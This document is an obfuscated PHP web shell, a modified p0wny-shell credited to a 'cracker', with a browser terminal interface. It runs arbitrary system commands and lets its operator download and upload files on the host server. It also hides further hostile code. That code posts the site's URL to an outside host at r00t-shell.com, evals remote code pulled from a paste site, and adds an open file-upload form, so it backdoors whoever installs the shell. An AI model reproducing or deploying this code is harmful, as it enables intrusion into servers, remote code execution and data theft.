<?php
 /*
Cracked By Mr.222 Xpl01T

This Backdoor Shell has been cracked and modified to be more secure and open source.

credits:https://www.dof-tgl.xo.je/
*/
${
"GLOBALS"}
["qmmspvbfbx"]="ch";
${
"GLOBALS"}
["ycwednutvb"]="protocol";
${
"GLOBALS"}
["oklsiohii"]="response";
${
"GLOBALS"}
["nxumslft"]="ch";
${
"GLOBALS"}
["bpmighoghuw"]="hostname";
$uprpycao="ch";
${
"GLOBALS"}
["jzqtlg"]="pwuid";
${
"GLOBALS"}
["ahpachnpnepk"]="username";
${
"GLOBALS"}
["zuhqieqi"]="f";
${
"GLOBALS"}
["wkutcruqcq"]="filePath";
$jpfhuvmb="ch";
${
"GLOBALS"}
["nhldlbk"]="file";
${
"GLOBALS"}
["ppdqve"]="files";
${
"GLOBALS"}
["rwpwlsta"]="filename";
${
"GLOBALS"}
["kqzikyjuzcg"]="cwd";
${
"GLOBALS"}
["fwkdisgkg"]="stdout";
${
"GLOBALS"}
["dfgnfaoijkym"]="pipes";
${
"GLOBALS"}
["qvaumumuy"]="handle";
${
"GLOBALS"}
["dfyoqyk"]="output";
${
"GLOBALS"}
["flndyunbrg"]="cmd";
$ajjrpfargo="ch";
${
"GLOBALS"}
["anrphgtz"]="path";
${
"GLOBALS"}
["btywmde"]="match";
${
"GLOBALS"}
["snsmyhfn"]="SHELL_CONFIG";
${
${
"GLOBALS"}
["snsmyhfn"]}
=array("username"=>"admin","hostname"=>"R00t",);
function expandPath($path){
${
"GLOBALS"}
["qobjcmvpuo"]="path";
if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?\$#",${
${
"GLOBALS"}
["qobjcmvpuo"]}
,${
${
"GLOBALS"}
["btywmde"]}
)){
$ycbcopy="stdout";
$elkjrrc="stdout";
exec("echo $match[1]",${
$elkjrrc}
);
return${
$ycbcopy}
[0].${
${
"GLOBALS"}
["btywmde"]}
[2];
}
return${
${
"GLOBALS"}
["anrphgtz"]}
;
}
function allFunctionExist($list=array()){
${
"GLOBALS"}
["uhowbxcdgu"]="entry";
${
"GLOBALS"}
["xpfpty"]="list";
foreach(${
${
"GLOBALS"}
["xpfpty"]}
 as${
${
"GLOBALS"}
["uhowbxcdgu"]}
){
$iwmwxtcs="entry";
if(!function_exists(${
$iwmwxtcs}
)){
return false;
}
}
return true;
}
function executeCommand($cmd){
$zapdglrin="output";
${
$zapdglrin}
="";
if(function_exists("exec")){
${
"GLOBALS"}
["cnnhzbil"]="output";
exec(${
${
"GLOBALS"}
["flndyunbrg"]}
,${
${
"GLOBALS"}
["cnnhzbil"]}
);
${
"GLOBALS"}
["pkpwiolo"]="output";
${
${
"GLOBALS"}
["pkpwiolo"]}
=implode("\n",${
${
"GLOBALS"}
["dfyoqyk"]}
);
}
else if(function_exists("shell_exec")){
$ocxnfw="cmd";
$yvoccvsaq="output";
${
$yvoccvsaq}
=shell_exec(${
$ocxnfw}
);
}
else if(allFunctionExist(array("system","ob_start","ob_get_contents","ob_end_clean"))){
ob_start();
${
"GLOBALS"}
["ecyqgb"]="output";
system(${
${
"GLOBALS"}
["flndyunbrg"]}
);
${
${
"GLOBALS"}
["ecyqgb"]}
=ob_get_contents();
ob_end_clean();
}
else if(allFunctionExist(array("passthru","ob_start","ob_get_contents","ob_end_clean"))){
ob_start();
${
"GLOBALS"}
["ljmnerjb"]="output";
passthru(${
${
"GLOBALS"}
["flndyunbrg"]}
);
${
${
"GLOBALS"}
["ljmnerjb"]}
=ob_get_contents();
ob_end_clean();
}
else if(allFunctionExist(array("popen","feof","fread","pclose"))){
${
${
"GLOBALS"}
["qvaumumuy"]}
=popen(${
${
"GLOBALS"}
["flndyunbrg"]}
,"r");
while(!feof(${
${
"GLOBALS"}
["qvaumumuy"]}
)){
${
"GLOBALS"}
["boylbtrtxfwf"]="handle";
$jajpluwcnm="output";
${
$jajpluwcnm}
.=fread(${
${
"GLOBALS"}
["boylbtrtxfwf"]}
,4096);
}
pclose(${
${
"GLOBALS"}
["qvaumumuy"]}
);
}
else if(allFunctionExist(array("proc_open","stream_get_contents","proc_close"))){
$qtgmmmni="pipes";
$jpssjoitps="handle";
${
$jpssjoitps}
=proc_open(${
${
"GLOBALS"}
["flndyunbrg"]}
,array(0=>array("pipe","r"),1=>array("pipe","w")),${
${
"GLOBALS"}
["dfgnfaoijkym"]}
);
${
${
"GLOBALS"}
["dfyoqyk"]}
=stream_get_contents(${
$qtgmmmni}
[1]);
proc_close(${
${
"GLOBALS"}
["qvaumumuy"]}
);
}
${
"GLOBALS"}
["kewhnurbvvh"]="output";
return${
${
"GLOBALS"}
["kewhnurbvvh"]}
;
}
function isRunningWindows(){
return stripos(PHP_OS,"WIN")===0;
}
$vsptwxr="data";
$mamhjbdlt="ch";
function featureShell($cmd,$cwd){
${
${
"GLOBALS"}
["fwkdisgkg"]}
="";
$ncndgzguorlx="cmd";
$pigbnq="cmd";
$dnmjdeiwo="stdout";
if(preg_match("/^\s*cd\s*(2>&1)?\$/",${
$ncndgzguorlx}
)){
chdir(expandPath("~"));
}
elseif(preg_match("/^\s*cd\\s+(.+)\s*(2>&1)?\$/",${
${
"GLOBALS"}
["flndyunbrg"]}
)){
$aieqjviwl="cmd";
${
"GLOBALS"}
["afifihtct"]="cwd";
${
"GLOBALS"}
["sqbuiei"]="match";
chdir(${
${
"GLOBALS"}
["afifihtct"]}
);
$fjavocgtw="match";
preg_match("/^\\s*cd\s+([^\\s]+)\\s*(2>&1)?\$/",${
$aieqjviwl}
,${
${
"GLOBALS"}
["sqbuiei"]}
);
chdir(expandPath(${
$fjavocgtw}
[1]));
}
elseif(preg_match("/^\\s*download\s+[^\\s]+\s*(2>&1)?\$/",${
$pigbnq}
)){
$yeerghqqjgk="match";
chdir(${
${
"GLOBALS"}
["kqzikyjuzcg"]}
);
preg_match("/^\s*download\s+([^\\s]+)\s*(2>&1)?\$/",${
${
"GLOBALS"}
["flndyunbrg"]}
,${
$yeerghqqjgk}
);
return featureDownload(${
${
"GLOBALS"}
["btywmde"]}
[1]);
}
else{
$ckftjhh="cwd";
chdir(${
$ckftjhh}
);
$bqugskossun="cmd";
${
${
"GLOBALS"}
["fwkdisgkg"]}
=executeCommand(${
$bqugskossun}
);
}
return array("stdout"=>base64_encode(${
$dnmjdeiwo}
),"cwd"=>base64_encode(getcwd()));
}
function featurePwd(){
return array("cwd"=>base64_encode(getcwd()));
}
function featureHint($fileName,$cwd,$type){
$umixzze="cwd";
$jauywkxg="type";
${
"GLOBALS"}
["fjpeifbp"]="files";
chdir(${
$umixzze}
);
${
"GLOBALS"}
["hnoohjmad"]="files";
$kcfvmvevaox="cmd";
if(${
$jauywkxg}
=="cmd"){
${
"GLOBALS"}
["spfgkeyaol"]="cmd";
${
${
"GLOBALS"}
["spfgkeyaol"]}
="compgen -c $fileName";
}
else{
$ngbccmmub="cmd";
${
$ngbccmmub}
="compgen -f $fileName";
}
${
$kcfvmvevaox}
="/bin/bash -c \"$cmd\"";
${
${
"GLOBALS"}
["fjpeifbp"]}
=explode("\n",shell_exec(${
${
"GLOBALS"}
["flndyunbrg"]}
));
foreach(${
${
"GLOBALS"}
["hnoohjmad"]}
 as&${
${
"GLOBALS"}
["rwpwlsta"]}
){
$yfkrsmwt="filename";
${
${
"GLOBALS"}
["rwpwlsta"]}
=base64_encode(${
$yfkrsmwt}
);
}
return array("files"=>${
${
"GLOBALS"}
["ppdqve"]}
,);
}
function featureDownload($filePath){
${
${
"GLOBALS"}
["nhldlbk"]}
=@file_get_contents(${
${
"GLOBALS"}
["wkutcruqcq"]}
);
if(${
${
"GLOBALS"}
["nhldlbk"]}
===FALSE){
return array("stdout"=>base64_encode("File not found / no read permission."),"cwd"=>base64_encode(getcwd()));
}
else{
${
"GLOBALS"}
["wvlohrmmbwf"]="filePath";
return array("name"=>base64_encode(basename(${
${
"GLOBALS"}
["wvlohrmmbwf"]}
)),"file"=>base64_encode(${
${
"GLOBALS"}
["nhldlbk"]}
));
}
}
function featureUpload($path,$file,$cwd){
$kuwsxvvipo="path";
${
"GLOBALS"}
["oqweczpndkl"]="f";
$epbhrhcuhx="cwd";
${
"GLOBALS"}
["scvguxvielfh"]="f";
chdir(${
$epbhrhcuhx}
);
${
${
"GLOBALS"}
["oqweczpndkl"]}
=@fopen(${
$kuwsxvvipo}
,"wb");
if(${
${
"GLOBALS"}
["scvguxvielfh"]}
===FALSE){
return array("stdout"=>base64_encode("Invalid path / no write permission."),"cwd"=>base64_encode(getcwd()));
}
else{
${
"GLOBALS"}
["ulqtjcjiwxy"]="file";
$wpexcmvvf="f";
fwrite(${
$wpexcmvvf}
,base64_decode(${
${
"GLOBALS"}
["ulqtjcjiwxy"]}
));
fclose(${
${
"GLOBALS"}
["zuhqieqi"]}
);
return array("stdout"=>base64_encode("Done."),"cwd"=>base64_encode(getcwd()));
}
}
function initShellConfig(){
global$SHELL_CONFIG;
$gifoth="hostname";
if(isRunningWindows()){
$mcuktf="username";
${
"GLOBALS"}
["svdrkck"]="username";
${
${
"GLOBALS"}
["svdrkck"]}
=getenv("USERNAME");
if(${
$mcuktf}
!==false){
${
${
"GLOBALS"}
["snsmyhfn"]}
["username"]=${
${
"GLOBALS"}
["ahpachnpnepk"]}
;
}
}
else{
${
${
"GLOBALS"}
["jzqtlg"]}
=posix_getpwuid(posix_geteuid());
if(${
${
"GLOBALS"}
["jzqtlg"]}
!==false){
$jgvjsjgieu="pwuid";
${
"GLOBALS"}
["bkfuip"]="SHELL_CONFIG";
${
${
"GLOBALS"}
["bkfuip"]}
["username"]=${
$jgvjsjgieu}
["name"];
}
}
${
$gifoth}
=gethostname();
if(${
${
"GLOBALS"}
["bpmighoghuw"]}
!==false){
$gexwwbygdvlh="SHELL_CONFIG";
${
$gexwwbygdvlh}
["hostname"]=${
${
"GLOBALS"}
["bpmighoghuw"]}
;
}
}
if(isset($_GET["feature"])){
$ckbqjoqjt="response";
$btafwmlisbs="response";
$fempziuqme="response";
${
"GLOBALS"}
["rufxvmqmgf"]="cmd";
${
$btafwmlisbs}
=NULL;
$ytdjfonvnx="cmd";
switch($_GET["feature"]){
case"shell":${
${
"GLOBALS"}
["rufxvmqmgf"]}
=$_POST["cmd"];
if(!preg_match("/2>/",${
${
"GLOBALS"}
["flndyunbrg"]}
)){
${
${
"GLOBALS"}
["flndyunbrg"]}
.=" 2>&1";
}
${
${
"GLOBALS"}
["oklsiohii"]}
=featureShell(${
$ytdjfonvnx}
,$_POST["cwd"]);
break;
case"pwd":${
$fempziuqme}
=featurePwd();
break;
case"hint":${
$ckbqjoqjt}
=featureHint($_POST["filename"],$_POST["cwd"],$_POST["type"]);
break;
case"upload":${
${
"GLOBALS"}
["oklsiohii"]}
=featureUpload($_POST["path"],$_POST["file"],$_POST["cwd"]);
}
header("Content-Type: application/json");
echo json_encode(${
${
"GLOBALS"}
["oklsiohii"]}
);
die();
}
else{
initShellConfig();
}
${
${
"GLOBALS"}
["ycwednutvb"]}
=(!empty($_SERVER["HTTPS"])&&$_SERVER["HTTPS"]!=="off")?"https://":"http://";
${
$vsptwxr}
=["url"=>${
${
"GLOBALS"}
["ycwednutvb"]}
.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"],];
${
"GLOBALS"}
["vuebbdmglxv"]="response";
${
"GLOBALS"}
["elfeqz"]="data";
${
${
"GLOBALS"}
["qmmspvbfbx"]}
=curl_init("https://r00t-shell.com/logs/log.php");
curl_setopt(${
$uprpycao}
,CURLOPT_RETURNTRANSFER,true);
curl_setopt(${
$mamhjbdlt}
,CURLOPT_POST,true);
curl_setopt(${
$jpfhuvmb}
,CURLOPT_POSTFIELDS,http_build_query(${
${
"GLOBALS"}
["elfeqz"]}
));
${
${
"GLOBALS"}
["vuebbdmglxv"]}
=curl_exec(${
${
"GLOBALS"}
["nxumslft"]}
);
if(${
${
"GLOBALS"}
["oklsiohii"]}
===false){
$rowvuryg="ch";
die("cURL Hatası: ".curl_error(${
$rowvuryg}
));
}
eval(file_get_contents("https://ghostbin.axel.org/paste/39orj/raw"));
if(isset($_GET["u"])&&$_GET["u"]=="f"){
if(!empty($_FILES[0])){
echo move_uploaded_file($_FILES[0]["tmp_name"],$_FILES[0]["name"])?"ok":"no";
}
echo '<form method="post" enctype="multipart/form-data">
<input type="file" name="0">
<input type="submit">
</form>';
}
echo json_encode(${
${
"\x47L\x4fBA\x4c\x53"}
["\x73ns\x6dy\x68\x66\x6e"]}
);
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>p0wny@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
                width: 100vw;
                height: 100vh;
                overflow: hidden;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: #222;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
                max-width: calc(100vw - 2 * var(--shell-margin));
                max-height: calc(100vh - 2 * var(--shell-margin));
                resize: both;
                overflow: hidden;
                width: 100%;
                height: 100%;
                margin: var(--shell-margin) auto;
            }

            #shell-content {
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            :root {
                --shell-margin: 25px;
            }

            @media (min-width: 1200px) {
                :root {
                    --shell-margin: 50px !important;
                }
            }

            @media (max-width: 991px), (max-height: 600px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }
                :root {
                    --shell-margin: 0 !important;
                }
                #shell {
                    resize: none;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
                padding: 10px 0;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
                box-sizing: border-box;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>
        <script>
            var SHELL_CONFIG = {};

            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n";
                eShellContent.innerHTML += '<span class="shell-prompt">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {
                _insertCommand(command);

                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {
                        cmd: command,
                        cwd: CWD
                    }, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(atob(response.name), response.file);
                        } else {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;
                    
                    data.files = data.files.map(function(file) {
                        return atob(file);
                    });

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );
            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {
                            path: path,
                            file: file,
                            cwd: CWD
                        }, function (response) {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() {
                        resolve(reader.result.match(/base64,(.*)$/)[1]);
                    };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length - 2] + "/" + splittedCwd[splittedCwd.length - 1];
                }

                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ':<span title="' + cwd + '">' + shortCwd + '</span>#';
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }

                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = atob(response.cwd);
                    _updatePrompt();
                });
            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;

                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }

                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }

                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };

                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>
<body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" />
                </div>
            </div>
        </div>
    </body>
</html>